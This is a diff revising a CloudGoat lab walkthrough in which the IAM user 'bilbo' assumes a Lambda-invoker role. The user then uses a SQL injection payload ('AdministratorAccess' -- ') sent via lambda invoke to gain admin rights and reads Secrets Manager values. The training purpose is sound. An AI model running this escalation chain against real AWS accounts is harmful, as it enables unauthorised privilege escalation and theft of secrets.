@@ -1,71 +1,129 @@
-1. Get permissions for the 'bilbo' user.
+## Step 1: Get Permissions for IAM User `bilbo`
+Before anything else, check what permissions the `bilbo` user currently has.
 
-    ```bash
-    # This command will give you the ARN & full name of you user.
-    aws --profile bilbo --region us-east-1 sts get-caller-identity
+### Commands
+```bash
+# Get the ARN and full name of the current user
+aws --profile bilbo --region us-east-1 sts get-caller-identity
 
-    # This command will list the policies attached to your user.
-    aws --profile bilbo --region us-east-1 iam list-user-policies --user-name [your_user_name]
+# List policies directly attached to the user (if any)
+aws --profile bilbo --region us-east-1 iam list-user-policies --user-name bilbo
 
-    # This command will list all of your permissions.
-    aws --profile bilbo --region us-east-1 iam get-user-policy --user-name [your_user_name] --policy-name [your_policy_name]
-    ```
+# List all permissions assigned via a user policy
+aws --profile bilbo --region us-east-1 iam get-user-policy --user-name bilbo --policy-name [your_policy_name]
+```
+### What This Does
+- The first command confirms that you're using the right AWS profile (`bilbo`).
+- The second command checks if there are any user-specific policies.
+- The third command retrieves details about a specific policy.
 
-2. List all roles, assume a role for privesc.
+---
 
-    ```bash
-    # This command will list all the roles in your account, one of which should be assumable. 
-    aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
+## Step 2: Find and Assume a Privileged Role
+The next step is to list all roles in the AWS account and look for one that `bilbo` can assume.
 
-    # This command will list all policies for the target role
-    aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
+### Commands
+```bash
+# List all roles in the AWS account (filtering for CloudGoat roles)
+aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
 
-    # This command will get you credentials for the cloudgoat role that can invoke lambdas.
-    aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name [whatever_you_want_here]
-    ```
+# Get all policies attached to the identified role
+aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
 
-3. List lambdas to identify the target (vulnerable) lambda.
+# Assume the role that allows invoking Lambda functions
+aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name assumed-role
+```
 
-    ```bash
-    # This command will show you all lambda functions. The function belonging to cloudgoat (the name should start with "cg-")
-    # can apply a predefined set of aws managed policies to users (in reality it can only modify the bilbo user).
-    aws --profile assumed_role --region us-east-1 lambda list-functions
-    ```
+### What This Does
+- Lists all roles, looking for ones associated with CloudGoat (`cg-`).
+- Checks what policies are attached to a promising role.
+- If the role is assumable, we assume it to gain higher privileges.
 
-4. Look at the lambda source code. You should see the database structure in a comment, 
-as well as the code that is handling input parameters. It's vulnerable to an injection, and 
-we'll see what an exploit looks like in the next step.
+---
 
-    ```bash
-    # This command will return a bunch of information about the lambda that can apply policies to bilbo.
-    # part of this information is a link to a url that will download the deployment package, which
-    # contains the source code for the function. Read over that source code to discover a vulnerability. 
-    aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
-    ```
+## Step 3: Identify the Target (Vulnerable) Lambda
+Once you have assumed the Lambda-invoker role, list all available Lambda functions to find the vulnerable one.
 
-5. Invoke the role applier lambda function, passing the name of the bilbo user and the injection payload. 
+### Command
+```bash
+# List all Lambda functions
+aws --profile assumed_role --region us-east-1 lambda list-functions
+```
 
-    ```bash
-    # Create the following SQL injection payload in a local JSON file, called 'payload.json'.
-    # Replace [bilbo_user_name_here] with the bilbo username.
-    {
-            "policy_names": ["AdministratorAccess' -- "],
-            "user_name": "[bilbo_user_name_here]"
-    }
+### What This Does
+- Retrieves all Lambda functions in the AWS account.
+- Identifies the one belonging to CloudGoat (it will likely start with `cg-`).
+- This Lambda can apply AWS policies to users—our attack target.
 
-    # The following command will send a SQL injection payload to the lambda function
-    aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt
+---
 
-    # cat the results to confirm everything is working properly
-    cat out.txt
-    ```
+## Step 4: Examine the Lambda Function’s Code
+The Lambda function contains source code that determines how it processes requests. We need to look at it for vulnerabilities.
 
-6. Now that Bilbo is an admin, use credentials for that user to list secrets from secretsmanager. 
+### Command
+```bash
+# Get detailed information about the vulnerable Lambda, including its source code package
+aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
+```
 
-    ```bash
-    # This command will list all the secrets in secretsmanager
-    aws --profile bilbo --region us-east-1 secretsmanager list-secrets
+### What This Does
+- Returns details about the function, including a **download URL** for its deployment package.
+- The package contains the Lambda function’s code.
+- Look for:
+  - **How it processes input** (is it properly sanitizing input?).
+  - **Any database structure hints** in the comments.
+  - **Potential injection vulnerabilities**.
 
-    # This command will get the value for a specific secret
-    aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
-    ```
+---
+
+## Step 5: Exploit the Lambda Function
+The function is vulnerable to an injection attack. We can exploit this by crafting a malicious payload.
+
+### Steps
+1. Create a JSON file (`payload.json`) with a specially crafted policy name:
+   ```json
+   {
+       "policy_names": ["AdministratorAccess' -- "],
+       "user_name": "[bilbo_user_name_here]"
+   }
+   ```
+2. Use the AWS CLI to invoke the Lambda function with this payload.
+
+### Commands
+```bash
+# Send the injection payload to the Lambda function
+aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt
+
+# Check the output to confirm success
+cat out.txt
+```
+
+### What This Does
+- The JSON payload **injects an extra policy application command** by escaping a string.
+- The Lambda function grants `AdministratorAccess` to `bilbo`, making them an admin.
+
+---
+
+## Step 6: Use Admin Privileges to Retrieve the Secret
+Now that `bilbo` has admin rights, we can access AWS Secrets Manager to retrieve the stored secret.
+
+### Commands
+```bash
+# List all secrets stored in AWS Secrets Manager
+aws --profile bilbo --region us-east-1 secretsmanager list-secrets
+
+# Retrieve the value of a specific secret
+aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
+```
+
+### What This Does
+- The first command lists all available secrets.
+- The second command retrieves the actual secret value.
+
+---
+
+## Scenario Clean up
+- Do not forget to destroy the scenario so you do not get charged by AWS. 
+  ```bash
+  ./cloudgoat.py destroy vulnerable_lambda
+  ```
